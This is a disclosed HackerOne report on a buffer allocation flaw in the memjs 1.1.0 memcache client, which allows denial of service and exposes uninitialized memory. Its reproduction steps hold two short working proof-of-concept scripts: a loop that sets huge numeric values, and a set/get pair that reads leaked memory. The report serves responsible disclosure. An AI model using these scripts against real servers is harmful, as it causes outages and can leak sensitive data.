---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '319809'
original_report_id: '319809'
title: '`memjs` allocates and stores buffers on typed input, resulting in DoS and
  uninitialized memory usage'
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2018-02-26T15:11:42.082Z'
disclosed_at: '2018-06-27T05:25:55.386Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 11
asset_identifier: memjs
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# `memjs` allocates and stores buffers on typed input, resulting in DoS and uninitialized memory usage

## Metadata

- HackerOne Report ID: 319809
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2018-06-27T05:25:55.386Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a Buffer allocation vulnerability in `memjs`.

In cases when the attacker is able to pass typed input (e.g. via JSON) to the storage, it allows to cause DoS (on all Node.js versions) and to store (and potentially later extract) chunks of uninitialized server memory containing sensitive data.

# Module

**module name:** `memjs`
**version:** 1.1.0
**npm page:** `https://www.npmjs.com/package/memjs`

## Module Description

> MemJS is a pure Node.js client library for using memcache, in particular, the MemCachier service. It uses the binary protocol and support SASL authentication.

## Module Stats

186 downloads in the last day
2 903 downloads in the last week
12 037 downloads in the last month

~144 444 estimated downloads per year *(yay, a pretty number)*

# Vulnerability

## Vulnerability Description

`memjs` passes `value` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'value' parameter (e.g. JSON).

## Steps To Reproduce:

`memcached` should be up and running.

### DoS

```js
var client = require('memjs').Client.create()
function tick() {
  var value = 2e9;
  client.set('key', value, {expires: 600 }, () => {});
}
setInterval(tick, 200);
```

### Uninitialized memory exposed (when running on Node.js below 8.0)

```js
var client = require('memjs').Client.create()
var value = 100;
client.set('key', value, {expires: 600 }, () => {});
client.get('key', (err, val) => console.log(val));
```

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0
- memcached 1.5.5

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Denial of service
Sensitive data leak (on Node.js < 8.x)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
